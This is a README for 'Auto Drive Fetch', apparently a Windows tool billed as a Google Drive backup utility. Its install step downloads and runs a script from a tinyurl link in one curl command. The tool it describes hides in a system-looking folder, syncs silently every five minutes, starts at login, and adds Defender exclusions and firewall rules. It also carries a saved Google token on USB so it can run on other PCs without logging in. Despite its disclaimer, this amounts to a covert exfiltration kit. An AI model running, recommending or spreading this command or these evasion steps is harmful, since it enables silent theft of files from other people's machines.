<div align="center">

# ⚡ Auto Drive Fetch  

### Google Drive Auto Backup • Portable • Permanent • Silent

<img src="https://img.shields.io/github/v/release/maiz-an/AutoDriveFetch?label=release&style=flat-square">
<img src="https://img.shields.io/github/downloads/maiz-an/AutoDriveFetch/total?style=flat-square">
<img src="https://img.shields.io/badge/platform-Windows-lightgrey?style=flat-square">
<img src="https://img.shields.io/badge/license-MIT-green?style=flat-square">

---

### 🛡️ Not for stealing files for stealing **peace of mind** 😌

✦ One command • Forever backup • Zero login after first setup ✦

</div>

---

## ⚠️ Trusted Use Only Disclaimer

Auto Drive Fetch is designed for:

✅ Personal backup  
✅ Business file protection  
✅ Secure sync automation  
✅ Disaster recovery  

🚫 **This tool must NOT be used for unauthorized access, spying, or malicious activity.**

Any misuse is strictly against the intent of this project.  
You are responsible for how you use it.

---

## 🚀 What is Auto Drive Fetch?

**Auto Drive Fetch** is a one-click Google Drive backup system for Windows.

It creates a hidden sync engine using **rclone**, installs permanently into:

```

%LOCALAPPDATA%.systembackup

````

Then it silently syncs your chosen folder to Google Drive **every 5 minutes**, forever.

---

## ✨ Features

✅ One-command installation  
✅ Google Drive authentication only once  
✅ Token stays inside the folder (portable forever)  
✅ Folder picker UI (no manual path typing)  
✅ Parent folder saved permanently  
✅ Subfolder selectable per PC  
✅ Runs silently in background  
✅ Auto-starts with Windows  
✅ Permanent install inside `.systembackup`

---

# ⚡ Installation (First Time Setup)

### ✅ Run this in Command Prompt (CMD)

```cmd
curl -L -o ADF_CLI.cmd https://tinyurl.com/maiz-adf && ADF_CLI.cmd
````

<img width="600" height="750" alt="Installer Running" src="https://github.com/user-attachments/assets/2d158897-163c-4f6b-93bf-d56f794c4e34" />

---

## What This Command Does Automatically

✔ Installs Python (if missing)
✔ Downloads all required backup files
✔ Starts the guided Google Drive authentication setup

<img width="600" height="656" alt="Setup Window" src="https://github.com/user-attachments/assets/ff8abf5e-db09-447a-baee-8adfdab8f2cc" />

---

## 🔐 Google Login (Only Required Once)

During the first run:

1. A new CMD window will open
2. It will ask you to login using your Google account
3. Your browser will open automatically
4. Sign in to the Google Drive account where backups should be stored
5. After successful login, you will see a confirmation message

<img width="300" height="388" alt="Login Success" src="https://github.com/user-attachments/assets/e0f83a1b-1ad3-4563-83c7-5d79e11a32b9" />

---

## ✅ Continue Setup After Login

Once the browser login is completed:

* Return to the original CMD window
* Press **Enter** two times
* The installer will ask you to enter a **Parent Folder Name** (this is created in Google Drive)

<img width="600" height="763" alt="Parent Folder Setup" src="https://github.com/user-attachments/assets/9e4d1268-5418-4728-932c-6c572b573f4b" />

---

## ✅ Setup Completed

After this step, Auto Drive Fetch is fully installed.

You can close the ADF_CLI.cmd window safely now.

---

#### ✅ Now you can Run on other PC

---

## 🚀 Using It on Another PC is Super Easy

To use Auto Drive Fetch on any new machine:

1. Copy the ADF_CLI.cmd (with `Source\`) folder to a USB drive or any location

```
ADF_CLI.cmd
Source\
 |- settings.json
 |- rclone.conf (Google token saved)
 |- rclone\
     |- rclone.exe

````

<img width="600" height="448" alt="Screenshot 2026-02-13 141707" src="https://github.com/user-attachments/assets/f11772cf-e677-4be7-833e-f76a9fc322d3" />

1. Paste it onto the new PC  
2. Run: (Double Click)

```cmd
ADF_CLI.cmd
````

---

## ✅ What Happens Next?

On the new PC:

* It will NOT ask for Google login again
* It will only ask you to enter a **Parent Folder name** (next time it will not ask parent folder name) and **Sub Folder name**

Example:

```
OfficePC
LaptopBackup
HomePC
```

Then Auto Drive Fetch will automatically complete setup and start syncing instantly. work done!

---

## That's it now it's Done

## ✅ How Portable Mode Works

### Step 1 — Setup Once on Your Main PC

Run the installer normally.
Login happens only once.

---

### Step 2 — Portable Pack is Ready

After setup, you will have:

```
ADF_CLI.cmd
Source\
```

Inside `Source\` lives:

✅ Google token
✅ rclone config
✅ settings.json

---

### Step 3 — Copy Anywhere

Copy this folder to:

* USB Drive
* External HDD
* Another Laptop
* Office PC

Now Auto Drive Fetch becomes:

✅ Plug & Run
✅ No login
✅ No setup again

---

# Features

## 🏗️ Permanent Installation

Auto Drive Fetch installs itself into:

```
%LOCALAPPDATA%\.systembackup
```

It continues running even if you delete the installer folder.

---

## 🔁 Background Auto Sync

Once installed:

* Runs silently (hidden)
* Sync loop uses:

```
sync_loop_xxx.vbs
```

* Starts automatically at Windows login

---

## 🛡️ Defender + Firewall Exclusions (Admin Only)

If CMD is run as Administrator:

✅ Windows Defender exclusions
✅ Firewall outbound rule for rclone

So backup never gets blocked.

---

## 📂 Logs & Debugging

| File                       | Location                 | Purpose                     |
| -------------------------- | ------------------------ | --------------------------- |
| `log.json`                 | `.systembackup\log.json` | Full setup + sync history   |
| `autodrivefetch_debug.log` | `%temp%`                 | Batch installer diagnostics |

---

## Full Uninstall

Delete:

```
%LOCALAPPDATA%\.systembackup
```

---

<div align="center">

### ⚡ Built with obsession by **Maiz**

Auto Drive Fetch = Backup that never sleeps 😈

</div>

---
